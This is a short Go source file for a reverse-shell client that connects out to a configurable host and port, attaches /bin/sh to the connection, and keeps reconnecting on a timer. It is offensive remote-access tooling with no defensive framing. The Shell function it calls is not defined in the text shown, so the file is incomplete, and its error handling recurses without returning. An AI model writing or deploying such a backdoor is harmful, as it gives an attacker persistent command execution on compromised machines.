package main

import (
	"net"
	"time"
    "flag"
)

type Config struct {
	Address 	string
	Shell		string
	OS			string
	Reconnect 	time.Duration
}

func main() {
	var config Config
	var host, port, reconnect string

    flag.StringVar(&host, "host", "127.0.0.1", "Host")
	flag.StringVar(&port, "port", "1234", "Port")
	flag.StringVar(&config.Shell, "shell", "/bin/sh", "Unix Shell")
	flag.StringVar(&reconnect, "recon", "15s", "Reconnecting Time")
    flag.Parse()

	config.Address = host + ":" + port
	config.Reconnect, _ = time.ParseDuration(reconnect)

	ReverseShell(config)
}

func ReverseShell(config Config) {
	conn, err := net.Dial("tcp", config.Address)
	if err != nil {
		if conn != nil {
			conn.Close()
		}

		Reconnect(config)
	}

	Shell(conn, config)
	Reconnect(config)
}

func Reconnect(config Config) {
	time.Sleep(config.Reconnect)
	ReverseShell(config)
}